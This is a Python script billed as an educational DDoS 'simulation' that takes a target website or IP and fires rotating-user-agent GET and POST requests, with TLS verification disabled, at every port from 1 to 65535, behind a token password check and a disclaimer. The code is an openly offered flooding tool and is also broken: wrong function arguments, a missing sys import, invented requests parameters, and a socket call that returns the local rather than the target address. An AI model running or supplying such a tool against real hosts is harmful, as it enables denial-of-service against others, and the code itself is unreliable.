import requests, time, colorama, socket, urllib3, threading

# Disable SSL/TLS verification
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color codes and initialize colorama
from colorama import Fore, Back, Style, init
init()

def alert_black():
    print(Fore.RED + Style.BRIGHT + '[!]', end="", flush=True)

def success():
    print(Fore.GREEN + Style.BRIGHT + "[+] ", end="", flush=True)

def warning_green():
    print(Fore.CYAN + Style.BRIGHT + "[!] ", end="", flush=True)

# Load user-agents file into a list
with open('agents.txt', 'r') as f:
    user_agent_pool = f.readlines()
    # Remove line breaks & trailing spaces
    user_agent_pool = [agent.strip() for agent in user_agent_pool]
    alert_black("[*] Loading Agents...")

# Read permissions from a file
with open("permission.txt", "r") as permFile:
    permission = permFile.read().strip()
    alert_black(f"[*] Permissions from file: {permission}")

def disclaimer():
    print(' ')
    print(Fore.MAGENTA + Style.BRIGHT + '''
     Disclaimer: This script is for education & research purposes only and DOES NOT
             implement a real DDoS Attack. It only simulates aspects and should not
              target illegal activities.

        Responsible usage implies ethical behavior,
            prior authorized access, and compliance
          with all relevant laws. MISUSE OF THE CODE IS STRONGLY PROHIBITED AND IS
              SUBJECT TO LEGAL CONSEQUENCES!
    ''')
    pass

# Check if it is the correct user
password_req = input(f"Authorization needed: {permission} \n Username: ")
allowed = password_req == "allowed" if permission.startswith('Authorized User:') else False

if not allowed:
    print(Fore.YELLOW + Style.BRIGHT + "[!] Access is forbidden. Exiting the script.")
    sys.exit(1)

def attack_multiple(server, port, useragent, method='GET', query=""):
    headers = {"User-Agent": useragent, "Connection": "close"}

    if method == "GET":
        response = requests.get(url=f"http://{server}:{port}/{query}", timeout=2, headers=headers, verify=False, pool_maxsize=15,
                                 pool_prealoc=15)

        if response.status_code not in [200, 202]:
            warning_green("[*] Error connecting to Server : " + str(server))

    elif method == "POST":
        response = requests.post(url=f"http://{server}:{port}/", timeout=2, data="A", headers=headers, verify=False, pool_maxsize=15,
                                  pool_prealoc=15)
        if response.status_code not in [200, 202]:
            warning_green("[*] Error connecting to Server : " + str(server))

# Start a series of attacks on the target system (IP or domain), listening ports (1-65535)
def main(website):

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((website, 80))
        website_ip = s.getsockname()[0]
        s.close()
    except:
        website_ip = website

    for port in range(1, 65536):
        attack_multiple(website_ip, port, user_agent_pool[int(time.time() * 1000) % len(user_agent_pool)])

# Main function
if __name__ == "__main__":
    disclaimer()
    target = input("Enter the target website or IP: ")
    main(target)
